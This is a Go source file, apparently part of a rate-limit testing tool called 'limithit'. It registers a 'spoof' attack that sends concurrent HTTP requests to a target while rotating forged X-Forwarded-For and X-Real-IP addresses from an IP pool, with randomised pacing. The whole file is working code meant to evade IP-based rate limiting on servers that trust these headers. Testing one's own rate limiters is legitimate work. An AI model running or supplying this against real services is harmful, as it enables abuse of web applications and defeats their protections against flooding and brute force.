package spoof

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/conantorreswf/limithit/internal/attacks"
	"github.com/conantorreswf/limithit/internal/metrics"
	"github.com/conantorreswf/limithit/internal/worker"
)

func init() {
	attacks.Register("spoof", func() attacks.Attack { return &Spoof{} })
}

type Spoof struct {
	method     string
	body       string
	ipPool     string
	pacing     string
	minDelayMs int
	maxDelayMs int
	rps        float64
	xffHeader  string
}

func (s *Spoof) Name() string     { return "spoof" }
func (s *Spoof) Synopsis() string { return "X-Forwarded-For rotation across an IP pool with pacing" }

func (s *Spoof) Flags(fs *flag.FlagSet) {
	fs.StringVar(&s.method, "method", "GET", "HTTP method")
	fs.StringVar(&s.body, "body", "", "request body")
	fs.StringVar(&s.ipPool, "ip-pool", "", `IP pool spec ("10.0.0.0/24" | "file:ips.txt" | "1.2.3.4,5.6.7.8")`)
	fs.StringVar(&s.pacing, "pacing", "none", "pacer: uniform|poisson|zipf|none")
	fs.IntVar(&s.minDelayMs, "min-delay-ms", 0, "min inter-request delay (ms, uniform/zipf)")
	fs.IntVar(&s.maxDelayMs, "max-delay-ms", 50, "max inter-request delay (ms, uniform/zipf)")
	fs.Float64Var(&s.rps, "rps", 50, "target rps (poisson)")
	fs.StringVar(&s.xffHeader, "xff-header", "X-Forwarded-For", "header used to inject spoofed IP")
}

func (s *Spoof) Validate() error {
	if s.ipPool == "" {
		return errors.New("--ip-pool is required")
	}
	m, err := validateMethod(s.method)
	if err != nil {
		return err
	}
	s.method = m
	return nil
}

func (s *Spoof) Run(ctx context.Context, base attacks.Base) (attacks.Report, error) {
	pool, err := metrics.NewIPPoolFromSpec(s.ipPool)
	if err != nil {
		return nil, fmt.Errorf("spoof: %w", err)
	}
	pacer, err := metrics.NewPacer(s.pacing,
		time.Duration(s.minDelayMs)*time.Millisecond,
		time.Duration(s.maxDelayMs)*time.Millisecond,
		s.rps,
	)
	if err != nil {
		return nil, fmt.Errorf("spoof: %w", err)
	}

	hdr := s.xffHeader
	if hdr == "" {
		hdr = "X-Forwarded-For"
	}

	build := func(ctx context.Context, _ int) (*http.Request, string, error) {
		var body io.Reader
		if s.body != "" {
			body = strings.NewReader(s.body)
		}
		req, err := http.NewRequestWithContext(ctx, s.method, base.URL, body)
		if err != nil {
			return nil, "", err
		}
		for k, vs := range base.Common.Headers {
			for _, v := range vs {
				req.Header.Add(k, v)
			}
		}
		ip := pool.Next()
		req.Header.Set(hdr, ip)
		req.Header.Set("X-Real-IP", ip)
		return req, "", nil
	}

	report := worker.Run(ctx, base.Client, build, worker.Config{
		Total:       base.Common.Total,
		Concurrency: base.Common.Concurrency,
		Pacer:       pacer,
		Tag:         fmt.Sprintf("spoof (pool=%d pacing=%s)", pool.Size(), s.pacing),
	})
	return report, nil
}

func validateMethod(m string) (string, error) {
	m = strings.ToUpper(m)
	switch m {
	case "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS":
		return m, nil
	}
	return "", fmt.Errorf("invalid method %q", m)
}
